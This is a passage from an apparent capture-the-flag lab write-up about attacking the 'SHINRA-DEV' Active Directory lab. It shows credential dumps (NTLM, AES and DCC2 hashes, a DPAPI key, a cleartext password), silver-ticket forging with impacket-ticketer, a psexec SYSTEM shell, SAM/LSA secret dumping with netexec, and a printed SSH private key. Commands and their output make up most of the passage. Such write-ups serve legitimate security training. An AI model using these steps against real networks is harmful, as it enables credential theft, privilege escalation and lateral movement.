        Password: 10bf1c25cfa376012473115a9fd6d1ac49e97e8b00c75f904d91812fa1258abfced1c6478f9cfca54b278758ae67867e0888270018b0a693531850a2b70dac6414ad005a53fc61a0c196cd511f59a9c9cbc2822bf37a81bded62861fe9bbb4712386000c28361aa606b686688b99bea156da7f59bedad68258adff893c22975f85cb0226384566753596e592549c69b34ad1fec94966764703a9a5c594545b9a0b6d16c637682c4b2fa8b1f1af373740c15dfab0783c2208bed2b36e7cf7109f99a8e3721148d4a3b35099ed4cf2300b925c2ab796c9978ca5e0e0937c89ab499f1afa5a47c252d0a9b836af84dd68a5
        password (hex)10bf1c25cfa376012473115a9fd6d1ac49e97e8b00c75f904d91812fa1258abfced1c6478f9cfca54b278758ae67867e0888270018b0a693531850a2b70dac6414ad005a53fc61a0c196cd511f59a9c9cbc2822bf37a81bded62861fe9bbb4712386000c28361aa606b686688b99bea156da7f59bedad68258adff893c22975f85cb0226384566753596e592549c69b34ad1fec94966764703a9a5c594545b9a0b6d16c637682c4b2fa8b1f1af373740c15dfab0783c2208bed2b36e7cf7109f99a8e3721148d4a3b35099ed4cf2300b925c2ab796c9978ca5e0e0937c89ab499f1afa5a47c252d0a9b836af84dd68a5
        AES128 Key: 05289ade6824056d4308d30c7d1e14ba
        AES256 Key: 1940184039ef4b59de48227fb6dd73e818d946d604555ecf126118aa0036c121
    == WDIGEST [3e7]==
        username CLIENT01$
        domainname SHINRA-DEV
        password None
        password (hex)
    == DPAPI [3e7]==
        luid 999
        key_guid 759b7af3-b0af-4e15-9597-527c74c2f5c9
        masterkey 01ae06b27b52ea260dd79c8be7479ceae0ee2f7885c8e12093f6c1107c0647201f1a6f42b3838d815df9337fdb2f7409168c1047728e47f4b1f0d9bd40f96aff
        sha1_masterkey d0847c775387351bd5e49b09bcff325d5fc98f94
```

Now I only have the credentials to the DEV01 machine (since my SEDEBUGPRIVS could let me dump the lsass.exe and not sam) for this reason I should be able to craft a Silver ticket?

```bash
└─$ impacket-ticketer -nthash 05289ade6824056d4308d30c7d1e14ba -domain-sid S-1-5-21-102928273-333185529-3642627421 -domain SHINRA-DEV.vl -spn cifs/CLIENT01.SHINRA-DEV.vl Administrator

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for SHINRA-DEV.vl/Administrator
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Saving ticket in Administrator.ccache
                                                                                                                                             
┌──(user㉿kali-almi)-[~/Downloads/Shinra]
└─$ export KRB5CCNAME=/home/user/Downloads/Shinra/Administrator.ccache                             
                                                                                                                                             
┌──(user㉿kali-almi)-[~/Downloads/Shinra]
└─$ klist
Ticket cache: FILE:/home/user/Downloads/Shinra/Administrator.ccache
Default principal: Administrator@SHINRA-DEV.VL

Valid starting       Expires              Service principal
03/24/2026 14:47:13  03/21/2036 14:47:13  cifs/CLIENT01.SHINRA-DEV.vl@SHINRA-DEV.VL
    renew until 03/21/2036 14:47:13

```

And now I have a shell:

```bash
─$ impacket-psexec SHINRA-DEV.VL/Administrator@CLIENT01.SHINRA-DEV.vl -k -no-pass
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on CLIENT01.SHINRA-DEV.vl.....
[*] Found writable share ADMIN$
[*] Uploading file akiyGqID.exe
[*] Opening SVCManager on CLIENT01.SHINRA-DEV.vl.....
[*] Creating service KOIK on CLIENT01.SHINRA-DEV.vl.....
[*] Starting service KOIK.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19045.2364]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> 


```

And now I have another flag:

```bash
 Directory of C:\Users\Administrator\Desktop

06/02/2025  08:43 AM    <DIR>          .
06/02/2025  08:43 AM    <DIR>          ..
06/02/2025  08:43 AM                40 flag.txt
               1 File(s)             40 bytes
               2 Dir(s)   7,859,769,344 bytes free

C:\Users\Administrator\Desktop> type flag.txt
SHINRA{bdeee3dc177f324094f163cb2962c25f}
C:\Users\Administrator\Desktop> 


```

Which these new creds I am also able to dump more stuff:

```bash
└─$ netexec smb client01.shinra-dev.vl -u Administrator -k --use-kcache --sam
SMB         client01.shinra-dev.vl 445    CLIENT01         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT01) (domain:shinra-dev.vl) (signing:False) (SMBv1:None)
SMB         client01.shinra-dev.vl 445    CLIENT01         [+] SHINRA-DEV.VL\Administrator from ccache (Pwn3d!)
SMB         client01.shinra-dev.vl 445    CLIENT01         [*] Dumping SAM hashes
SMB         client01.shinra-dev.vl 445    CLIENT01         Administrator:500:aad3b435b51404eeaad3b435b51404ee:995b2b8c335d042e16081e0f0caec5fe:::
SMB         client01.shinra-dev.vl 445    CLIENT01         Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         client01.shinra-dev.vl 445    CLIENT01         DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         client01.shinra-dev.vl 445    CLIENT01         WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:79a712a07ef84bcab26cd34553eed632:::
SMB         client01.shinra-dev.vl 445    CLIENT01         dev:1002:aad3b435b51404eeaad3b435b51404ee:889102200596dfeb9b6a8252856bfadc:::
SMB         client01.shinra-dev.vl 445    CLIENT01         [+] Added 5 SAM hashes to the database
                                                                                                                                             
┌──(user㉿kali-almi)-[~/Downloads/Shinra]
└─$ netexec smb client01.shinra-dev.vl -u Administrator -k --use-kcache --lsa
SMB         client01.shinra-dev.vl 445    CLIENT01         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT01) (domain:shinra-dev.vl) (signing:False) (SMBv1:None)
SMB         client01.shinra-dev.vl 445    CLIENT01         [+] SHINRA-DEV.VL\Administrator from ccache (Pwn3d!)
SMB         client01.shinra-dev.vl 445    CLIENT01         [+] Dumping LSA secrets
SMB         client01.shinra-dev.vl 445    CLIENT01         SHINRA-DEV.VL/Ashleigh.Lewis:$DCC2$10240#Ashleigh.Lewis#f35a9ae1d25cfd2834fac26be7c2badb: (2026-03-24 03:39:43)
SMB         client01.shinra-dev.vl 445    CLIENT01         SHINRA-DEV.VL/Lynda.Parry:$DCC2$10240#Lynda.Parry#5c85febee0db5f9825abca75f0062f5c: (2023-01-02 07:14:15)
SMB         client01.shinra-dev.vl 445    CLIENT01         SHINRA-DEV.VL/Administrator:$DCC2$10240#Administrator#354886cd3559a0d6bcbb2164d7a07cb4: (2025-06-02 08:40:40)
SMB         client01.shinra-dev.vl 445    CLIENT01         SHINRA-DEV\CLIENT01$:plain_password_hex:10bf1c25cfa376012473115a9fd6d1ac49e97e8b00c75f904d91812fa1258abfced1c6478f9cfca54b278758ae67867e0888270018b0a693531850a2b70dac6414ad005a53fc61a0c196cd511f59a9c9cbc2822bf37a81bded62861fe9bbb4712386000c28361aa606b686688b99bea156da7f59bedad68258adff893c22975f85cb0226384566753596e592549c69b34ad1fec94966764703a9a5c594545b9a0b6d16c637682c4b2fa8b1f1af373740c15dfab0783c2208bed2b36e7cf7109f99a8e3721148d4a3b35099ed4cf2300b925c2ab796c9978ca5e0e0937c89ab499f1afa5a47c252d0a9b836af84dd68a5
SMB         client01.shinra-dev.vl 445    CLIENT01         SHINRA-DEV\CLIENT01$:aad3b435b51404eeaad3b435b51404ee:05289ade6824056d4308d30c7d1e14ba:::
SMB         client01.shinra-dev.vl 445    CLIENT01         shinra-dev.vl\ashleigh.lewis:eqYQ5_RXZtUYPJ
SMB         client01.shinra-dev.vl 445    CLIENT01         dpapi_machinekey:0x12dcc24eab901712e9b94519fa1efc6f84407ad5
dpapi_userkey:0x274e25ea09a68974d69a6d3be93f238cff0d3152
SMB         client01.shinra-dev.vl 445    CLIENT01         [+] Dumped 7 LSA secrets to /home/user/.nxc/logs/lsa/client01.shinra-dev.vl_None_2026-03-24_145352.secrets and /home/user/.nxc/logs/lsa/client01.shinra-dev.vl_None_2026-03-24_145352.cached

```

Now before moving forward I see that there is some SSH keys for the user Lydia on this machine? I do wonder what machine get's this to?

```bash
evil-winrm-py PS C:\Users\lynda.parry\Documents\keys> cat id_ed25519
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABCdN32Qxp
5pn+veS2GAhGFUAAAAEAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIGnckXQL2Mf+KfZG
kQN+ZVKZ7iYUw+M6heDggUVubtKwAAAAsHabMQakjEIwOmoAfcP4yyofQIV/pZsacoOGEv
TAtckByHlXgW+qLvJsIiG5Y/wkgAh03vIiznLntBAEBXn8ounla5EiLK4G5QHS91HwsKh4
LJ9iNQEeZyQv/x+4vBYm2Is1XZeZk6zp8kwADE3Yv0hdB5T3aCHohvWE1SQdz6B0ZLPTJX
6TfjRHpPIgOycQAOUjNaDStYold+L2hWkwQfZ6qrHZHKXbQ+9oferWNE45
-----END OPENSSH PRIVATE KEY-----

```

Now this is for the PROV machine which I have already root access which means I should be done.

![e2bea326e4cdeb7f6f645f1f8fcef313.png](../../../_resources/e2bea326e4cdeb7f6f645f1f8fcef313.png)

Now I will moe on to the CLIENT04.